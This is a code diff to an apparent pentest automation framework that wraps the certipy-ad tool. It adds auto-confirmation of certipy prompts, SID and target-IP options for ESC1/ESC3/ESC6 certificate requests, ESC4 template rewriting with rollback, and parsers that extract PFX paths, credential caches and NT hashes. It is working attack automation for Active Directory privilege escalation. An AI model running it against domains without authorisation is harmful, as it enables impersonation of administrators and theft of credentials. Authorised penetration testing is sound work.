@@ -166,6 +166,7 @@ async def run_certipy(
     subcommand: str,
     args: list[str],
     timeout: int = 60,
+    input_data: bytes | None = None,
 ) -> dict[str, Any]:
     """Run a certipy-ad command and return parsed output.
 
@@ -194,12 +195,20 @@ async def run_certipy(
         subcommand: The certipy subcommand to invoke.
         args: Additional CLI arguments for the subcommand.
         timeout: Maximum seconds to wait for the subprocess.
+        input_data: Optional bytes to write to certipy's stdin.  Used to
+            auto-confirm interactive prompts (e.g. ``certipy template``
+            asks "Are you sure you want to apply these changes?").
+            Pass ``b"y\\n"`` to confirm.  Subprocess capture mode keeps
+            stdin attached as a pipe so unattended pentest automation
+            never hangs on a prompt.
 
     Returns:
         Standardised result dict with ``success``, ``output``, ``parsed``,
         and ``error`` keys.
     """
-    result = await _run_certipy_once(subcommand, args, timeout=timeout)
+    result = await _run_certipy_once(
+        subcommand, args, timeout=timeout, input_data=input_data,
+    )
 
     # LDAPS → plain-LDAP auto-retry, but only when the caller hasn't
     # already pinned a scheme.
@@ -211,7 +220,7 @@ async def run_certipy(
         )
         retry_args = ["-ldap-scheme", "ldap"] + list(args)
         retry_result = await _run_certipy_once(
-            subcommand, retry_args, timeout=timeout,
+            subcommand, retry_args, timeout=timeout, input_data=input_data,
         )
         retry_result["ldaps_retry"] = True
         retry_result["ldaps_first_error"] = first_error
@@ -229,6 +238,7 @@ async def _run_certipy_once(
     subcommand: str,
     args: list[str],
     timeout: int = 60,
+    input_data: bytes | None = None,
 ) -> dict[str, Any]:
     """Execute a single certipy invocation. Caller orchestrates retries.
 
@@ -250,13 +260,22 @@ async def _run_certipy_once(
     }
 
     try:
+        # When auto-confirming a prompt (input_data set), open stdin
+        # as a pipe so communicate() can write to it.  Otherwise leave
+        # stdin inherited from the parent process — pinning it to
+        # ``DEVNULL`` causes certipy v5 ``req`` to bail with
+        # ``EOFError: EOF when reading a line`` because some of its
+        # internal flows call ``input()`` (e.g. during auth fallback)
+        # and a closed stdin trips that immediately even when no
+        # prompt is actually shown to the user.
         proc = await asyncio.create_subprocess_exec(
             *cmd,
+            stdin=asyncio.subprocess.PIPE if input_data is not None else None,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
         stdout_bytes, stderr_bytes = await asyncio.wait_for(
-            proc.communicate(), timeout=timeout
+            proc.communicate(input=input_data), timeout=timeout
         )
 
         stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
@@ -650,9 +669,19 @@ def _extract_findings_from_text(stdout: str) -> list[dict[str, str]]:
                         ca_name = s
                         break
 
-        # Iterate ESC lines within the block
+        # Iterate ESC lines within the block.
+        #
+        # Lookahead variants:
+        #   * ``\n\s*(?:ESC\d|\[|Template|$)`` — next section header,
+        #     or end-of-block following a trailing newline.
+        #   * ``$`` (outer) — end-of-string with NO preceding newline,
+        #     which is what we get when the captured stdout has been
+        #     ``.strip()``-ed by ``_run_certipy_once``.  Without this
+        #     alternative the LAST ESC finding in the LAST template is
+        #     silently dropped — see the bug where stripped stdout
+        #     ending in ``permissions.`` produced zero findings.
         for m in re.finditer(
-            r"ESC(\d+[a-z]?)\s*:\s*(.+?)(?=\n\s*(?:ESC\d|\[|Template|$))",
+            r"ESC(\d+[a-z]?)\s*:\s*(.+?)(?=\n\s*(?:ESC\d|\[|Template|$)|$)",
             block, re.DOTALL,
         ):
             esc = f"ESC{m.group(1).upper()}"
@@ -679,8 +708,18 @@ def _parse_req_output(stdout: str) -> dict[str, Any] | None:
     """Parse ``certipy req`` output to extract the PFX path."""
     parsed: dict[str, Any] = {}
 
-    # certipy req writes: "Saved certificate and private key to '<name>.pfx'"
-    pfx_match = re.search(r"Saved certificate and private key to '(.+?\.pfx)'", stdout)
+    # Certipy versions vary in which message they print:
+    #   v4 / older v5: "Saved certificate and private key to 'X.pfx'"
+    #   v5.0.4+:       "Saving certificate and private key to 'X.pfx'"
+    #                  "Wrote certificate and private key to 'X.pfx'"
+    # Match all three so the parser doesn't silently lose the PFX path
+    # on the user's actual installed version — that bug manifested as
+    # `Certificate request succeeded but no PFX path in output` even
+    # when the cert had been issued correctly.
+    pfx_match = re.search(
+        r"(?:Saved|Saving|Wrote) certificate and private key to '(.+?\.pfx)'",
+        stdout,
+    )
     if pfx_match:
         parsed["pfx_path"] = pfx_match.group(1)
 
@@ -715,8 +754,10 @@ def _parse_auth_output(stdout: str) -> dict[str, Any] | None:
     if nt_match:
         parsed["nt_hash"] = nt_match.group(1).lower()
 
-    # ccache file path
-    ccache_match = re.search(r"Saved credential cache to '(.+?\.ccache)'", stdout)
+    # ccache file path — certipy v5.0.4 says "Saving"/"Wrote", not "Saved"
+    ccache_match = re.search(
+        r"(?:Saved|Saving|Wrote) credential cache to '(.+?\.ccache)'", stdout,
+    )
     if ccache_match:
         parsed["ccache_path"] = ccache_match.group(1)
 
@@ -741,8 +782,11 @@ def _parse_shadow_output(stdout: str) -> dict[str, Any] | None:
     if device_match:
         parsed["device_id"] = device_match.group(1)
 
-    # PFX path from shadow auto/add
-    pfx_match = re.search(r"Saved certificate and private key to '(.+?\.pfx)'", stdout)
+    # PFX path from shadow auto/add — see _parse_req_output comment.
+    pfx_match = re.search(
+        r"(?:Saved|Saving|Wrote) certificate and private key to '(.+?\.pfx)'",
+        stdout,
+    )
     if pfx_match:
         parsed["pfx_path"] = pfx_match.group(1)
 
@@ -759,8 +803,10 @@ def _parse_shadow_output(stdout: str) -> dict[str, Any] | None:
     if nt_match:
         parsed["nt_hash"] = nt_match.group(1).lower()
 
-    # ccache from shadow auto
-    ccache_match = re.search(r"Saved credential cache to '(.+?\.ccache)'", stdout)
+    # ccache from shadow auto — see _parse_req_output comment.
+    ccache_match = re.search(
+        r"(?:Saved|Saving|Wrote) credential cache to '(.+?\.ccache)'", stdout,
+    )
     if ccache_match:
         parsed["ccache_path"] = ccache_match.group(1)
 
@@ -771,8 +817,14 @@ def _parse_template_output(stdout: str) -> dict[str, Any] | None:
     """Parse ``certipy template`` output for saved configuration."""
     parsed: dict[str, Any] = {}
 
-    # Old template config backup path
-    old_match = re.search(r"Saved old configuration.*?'(.+?\.json)'", stdout)
+    # Old template config backup path.  certipy v5 wording varies:
+    # "Saved old configuration to ..." (older), "Saving configuration to ..."
+    # (v5.0.4), "Wrote configuration to ...".  Match all three so the
+    # restore step always has a path to roll back from.
+    old_match = re.search(
+        r"(?:Saved|Saving|Wrote)\s+(?:old\s+)?configuration.*?'(.+?\.json)'",
+        stdout,
+    )
     if old_match:
         parsed["old_config_path"] = old_match.group(1)
 
@@ -841,29 +893,60 @@ async def certipy_request(
     auth_args: list[str],
     upn: str | None = None,
     on_behalf_of: str | None = None,
+    sid: str | None = None,
+    target_ip: str | None = None,
     timeout: int = 60,
 ) -> dict[str, Any]:
     """Request a certificate from a Certificate Authority.
 
     Args:
-        target: Domain controller host or IP.
+        target: Hostname for ``-target`` — preferably the CA's FQDN.
+            certipy uses this for the RPC connection to the CA.  Passing
+            the bare DC IP causes certipy to fall back to NETBIOS name
+            resolution, which times out on most pentest networks; pass
+            the FQDN here and use *target_ip* to override DNS.
         ca: Certificate Authority name (e.g. ``"CORP-CA"``).
         template: Certificate template name.
         auth_args: Authentication arguments.
         upn: Alternate UPN to specify in the SAN (ESC1/ESC6 exploitation).
         on_behalf_of: Request certificate on behalf of another user (ESC3).
+        sid: Object SID to embed in the SAN URL extension.  Required by
+            modern AD environments that enforce the
+            ``szOID_NTDS_CA_SECURITY_EXT`` mitigation (May 2022 patch).
+            Pass the target principal's SID (e.g.
+            ``"S-1-5-21-...-500"`` for Administrator).  When omitted on
+            an environment that requires it, PKINIT will fail with
+            ``KDC_ERR_CLIENT_NOT_TRUSTED`` after issuance.
+        target_ip: Explicit IP override for *target*.  When set, certipy
+            connects to this IP instead of resolving *target* via DNS.
+            Use this so PathStrike works on attacker hosts without
+            ``/etc/hosts`` entries for the target domain.
 
     Returns:
         Result dict. On success, ``parsed["pfx_path"]`` contains the PFX output path.
     """
     args = ["-target", target, "-ca", ca, "-template", template] + auth_args
 
+    if target_ip:
+        args.extend(["-target-ip", target_ip])
     if upn:
         args.extend(["-upn", upn])
     if on_behalf_of:
         args.extend(["-on-behalf-of", on_behalf_of])
+    if sid:
+        args.extend(["-sid", sid])
 
-    return await run_certipy("req", args, timeout=timeout)
+    # Auto-confirm certipy v5's file-overwrite prompt — when the output
+    # PFX already exists from a previous run, certipy asks
+    # ``File 'x.pfx' already exists. Overwrite? (y/n - saying no will save
+    # with a unique filename)``.  In subprocess mode that prompt reads
+    # from stdin and trips ``EOFError: EOF when reading a line`` which
+    # certipy's higher-level error handler sometimes surfaces as the
+    # cryptic ``The NETBIOS connection with the remote host timed out``
+    # — both end the same way: cert request silently fails after the
+    # cert was actually issued.  ``y`` overwrites the file and lets the
+    # parser pick up the PFX path normally.
+    return await run_certipy("req", args, timeout=timeout, input_data=b"y\n")
 
 
 async def certipy_auth(
@@ -945,7 +1028,9 @@ async def certipy_template(
     auth_args: list[str],
     save_old: bool = True,
     configuration: dict[str, Any] | None = None,
-    timeout: int = 60,
+    write_default: bool = False,
+    target_ip: str | None = None,
+    timeout: int = 120,
 ) -> dict[str, Any]:
     """Modify a certificate template configuration.
 
@@ -953,18 +1038,49 @@ async def certipy_template(
     to restore the original configuration.
 
     Args:
-        target: Domain controller host or IP.
+        target: Hostname (preferably FQDN) for ``-target``.  Used for
+            the LDAP write that updates the template object.  Pass the
+            DC FQDN here and use *target_ip* to override DNS resolution.
         template: Certificate template name.
         auth_args: Authentication arguments.
-        save_old: If ``True``, save the old template configuration to a JSON file.
-        configuration: Optional JSON configuration file path to apply (for restore).
+        save_old: If ``True``, save the old template configuration to a
+            JSON file before modifying — the path ends up in
+            ``parsed["old_config_path"]`` so callers can pass it back
+            via ``configuration`` to roll back.
+        configuration: Optional dict with ``"config_path"`` pointing at
+            a previously-saved JSON config to write back.  Used by ESC4
+            rollback / handlers' restore step.
+        write_default: When ``True``, pass ``-write-default-configuration``
+            so certipy rewrites the template to its default
+            ESC1-vulnerable shape (the actual ESC4 attack).  Without
+            this, the command is a no-op or save-only.
+        target_ip: Explicit IP override for *target* — passed via
+            ``-target-ip`` so certipy bypasses DNS resolution.  Same
+            pattern as :func:`certipy_request`; necessary on attacker
+            hosts that don't have ``/etc/hosts`` entries for the target
+            domain.
+        timeout: Maximum seconds to wait.  Default raised to 120s
+            because template-write operations involve LDAP roundtrips
+            plus an interactive prompt confirmation; the previous 60s
+            default fired before certipy could finish on slower DCs.
 
     Returns:
         Result dict. On success, ``parsed["old_config_path"]`` may contain
         the path to the saved original configuration.
+
+    Notes:
+        certipy ``template`` interactively asks "Are you sure you want
+        to apply these changes?" with no flag to suppress the prompt.
+        We auto-confirm by piping ``y\\n`` to stdin so unattended
+        pentest automation never hangs.  See :func:`run_certipy` for
+        the stdin plumbing.
     """
     args = ["-target", target, "-template", template] + auth_args
 
+    if target_ip:
+        args.extend(["-target-ip", target_ip])
+    if write_default:
+        args.append("-write-default-configuration")
     if save_old:
         # certipy uses -save-configuration <file>, not -save-old
         args.extend(["-save-configuration", f"{template}_backup.json"])
@@ -974,7 +1090,12 @@ async def certipy_template(
             # certipy uses -write-configuration, not -configuration
             args.extend(["-write-configuration", config_path])
 
-    return await run_certipy("template", args, timeout=timeout)
+    # Auto-confirm the "Are you sure?" prompt.  Multiple newlines
+    # cover any second prompt certipy v5 might ask (it's stable in v5
+    # but defending against future versions costs nothing here).
+    return await run_certipy(
+        "template", args, timeout=timeout, input_data=b"y\ny\ny\n",
+    )
 
 
 async def certipy_account(
